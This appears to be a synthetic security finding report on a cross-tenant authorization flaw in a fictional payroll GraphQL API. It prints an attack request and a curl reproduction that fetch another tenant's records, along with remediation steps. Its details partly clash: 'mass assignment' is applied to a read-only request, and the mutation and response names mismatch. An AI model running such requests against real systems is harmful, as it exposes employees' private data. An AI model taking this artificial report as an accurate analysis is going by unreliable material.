# Security Analysis Report
**System:** WageFlow Payroll API
**Domain:** HR / Payroll Processing
**Example ID:** GQL-0296
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `bulkResourceLookup` — attacker from `tenant-a194` reads payroll records including sensitive HR data owned by `tenant-94c1` |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields (Pattern 1.12)

### Summary
The `bulkResourceLookup` mutation on WageFlow Payroll API (`api.wageflow-payroll-api.example.com`) accepts an array of resource IDs without per-ID tenancy validation. Per §5.0 Pattern 1.12, the `updateResource` mutation also accepts `ownerId` and `tenantId` as writable input fields, enabling mass ownership reassignment. HR/payroll data exposure includes highly sensitive financial and personal employee data. The Redis cache is keyed by `resourceId` only (no tenant dimension), amplifying the risk.

**Context.txt inconsistency (documented):** The HAR request uses the `bulkResourceLookup` mutation, but the response JSON key is `getResource`. These names conflict. The HAR (§6.0) request is the primary evidence.

**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-a19494c1"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected resolver:** `bulkResourceLookup` (HAR-evidenced); `updateResource` (mass assignment design risk per §5.0)
**Affected endpoint:** `POST https://api.wageflow-payroll-api.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-a194`, bulk-fetching victim `tenant-94c1` records)**
```
POST https://api.wageflow-payroll-api.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-a194

{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2296\", \"R-1296\", \"R-3296\"]) { resourceId tenantId data { sensitiveField } } }"}
```

**Response — Cross-Tenant Payroll Record Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-94c1",
      "ownerId": "other-user-a19494c1",
      "data": {
        "sensitiveField": "CONFIDENTIAL-a19494c1",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-a19494c1` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.wageflow-payroll-api.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-a194" \
  -d '{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2296\", \"R-1296\", \"R-3296\"]) { resourceId tenantId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-94c1 returned for tenant-a194 caller
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Validate each ID in `bulkResourceLookup` against JWT `tenantId` before returning.
2. Remove `ownerId` and `tenantId` from writable input fields in `updateResource`.
3. Key Redis cache on `tenantId:resourceId` composite, not `resourceId` alone.
